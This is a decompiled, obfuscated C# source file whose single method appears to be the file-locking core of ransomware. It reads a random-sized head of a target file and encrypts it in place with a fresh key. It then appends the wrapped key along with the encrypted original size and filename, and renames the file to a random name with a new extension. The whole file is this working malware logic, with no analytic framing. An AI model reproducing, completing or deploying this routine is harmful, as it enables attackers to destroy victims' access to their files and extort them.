using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using ns0;
using ns1;

namespace ns4;

internal static class Class12
{
	internal unsafe static bool smethod_0(string string_0, byte[] byte_0, byte[] byte_1, int int_0, int int_1)
	{
		void* ptr = stackalloc byte[25];
		try
		{
			byte[] array2;
			byte[] array3;
			byte[] array5;
			byte[] array4;
			if (!File.Exists(string_0))
			{
				((byte*)ptr)[24] = 0;
			}
			else
			{
				*(int*)ptr = 32;
				*(int*)((byte*)ptr + 4) = 256;
				*(int*)((byte*)ptr + 8) = int_1 * 1048576;
				*(int*)((byte*)ptr + 12) = new Random().Next(int_0, *(int*)((byte*)ptr + 8));
				if (new DriveInfo(string_0.Substring(0, 1) + ":\\").AvailableFreeSpace <= *(int*)((byte*)ptr + 12) * 2)
				{
					((byte*)ptr)[24] = 0;
				}
				else if (Encoding.UTF8.GetBytes(new FileInfo(string_0).Name).Length > *(int*)((byte*)ptr + 4))
				{
					((byte*)ptr)[24] = 0;
				}
				else
				{
					byte[] array = Class21.smethod_78(32);
					array2 = Class21.smethod_45(array, byte_0);
					array3 = SHA256.Create().ComputeHash(array);
					array4 = new byte[*(int*)((byte*)ptr + 12)];
					array5 = new byte[32];
					using BinaryReader binaryReader = new BinaryReader(File.Open(string_0, FileMode.Open, FileAccess.Read, FileShare.None));
					array4 = binaryReader.ReadBytes(array4.Length);
					Buffer.BlockCopy(array4, 0, array5, 0, array5.Length - 16);
					Buffer.BlockCopy(array4, array4.Length - 16, array5, 16, array5.Length - 16);
					array4 = Class21.smethod_50(array, byte_1, array4);
					if (array4 != null)
					{
						binaryReader.Close();
						goto IL_0147;
					}
					((byte*)ptr)[24] = 0;
				}
			}
			goto end_IL_0006;
			IL_0147:
			using (BinaryWriter binaryWriter = new BinaryWriter(File.Open(string_0, FileMode.Open, FileAccess.Write, FileShare.None)))
			{
				binaryWriter.Write(array4, 0, array4.Length);
				binaryWriter.Close();
			}
			byte[] array6 = new byte[*(int*)ptr];
			Encoding uTF = Encoding.UTF8;
			*(int*)((byte*)ptr + 20) = array4.Length;
			byte[] bytes = uTF.GetBytes(((int*)((byte*)ptr + 20))->ToString());
			Buffer.BlockCopy(bytes, 0, array6, 0, bytes.Length);
			byte[] array7 = Class21.smethod_78(32);
			byte[] byte_2 = Class21.smethod_15(1000, 8, byte_0, byte_1);
			byte[] array8 = SHA256.Create().ComputeHash(array7);
			byte[] array9 = Class21.smethod_45(array7, byte_0);
			array6 = Class21.smethod_53(array7, array6, byte_2);
			bytes = null;
			array4 = null;
			byte[] array10 = new byte[*(int*)((byte*)ptr + 4)];
			byte[] bytes2 = Encoding.UTF8.GetBytes(new FileInfo(string_0).Name);
			Buffer.BlockCopy(bytes2, 0, array10, 0, bytes2.Length);
			byte[] array11 = Class21.smethod_78(32);
			byte[] byte_3 = Class21.smethod_15(1000, 8, byte_0, byte_1);
			byte[] array12 = SHA256.Create().ComputeHash(array11);
			byte[] array13 = Class21.smethod_45(array11, byte_0);
			array10 = Class21.smethod_53(array11, array10, byte_3);
			byte[] array14 = new byte[array5.Length + array2.Length + array3.Length + *(int*)ptr + array9.Length + array8.Length + *(int*)((byte*)ptr + 4) + array13.Length + array12.Length];
			array14 = Class21.smethod_111(new byte[9][] { array5, array2, array3, array6, array9, array8, array10, array13, array12 });
			using (BinaryWriter binaryWriter2 = new BinaryWriter(File.Open(string_0, FileMode.Append, FileAccess.Write, FileShare.None)))
			{
				binaryWriter2.Write(array14);
			}
			string text = "";
			text = Class21.smethod_36(16, bool_0: true);
			string text2 = $"{new FileInfo(string_0).DirectoryName}\\{text}.{Class6.Class7.smethod_6()}";
			*(int*)((byte*)ptr + 16) = 0;
			while (true)
			{
				if (!File.Exists(text2))
				{
					File.Move(string_0, text2);
				}
				if (*(int*)((byte*)ptr + 16) <= 3)
				{
					(*(int*)((byte*)ptr + 16))++;
					if (File.Exists(text2))
					{
						if (!File.Exists(text2))
						{
							((byte*)ptr)[24] = 0;
						}
						else
						{
							((byte*)ptr)[24] = 1;
						}
						break;
					}
					continue;
				}
				((byte*)ptr)[24] = 0;
				break;
			}
			end_IL_0006:;
		}
		catch (UnauthorizedAccessException)
		{
			((byte*)ptr)[24] = 0;
		}
		catch (FileNotFoundException)
		{
			((byte*)ptr)[24] = 0;
		}
		catch (OutOfMemoryException)
		{
			((byte*)ptr)[24] = 0;
		}
		catch (Exception)
		{
			((byte*)ptr)[24] = 0;
		}
		return ((byte*)ptr)[24] != 0;
	}
}
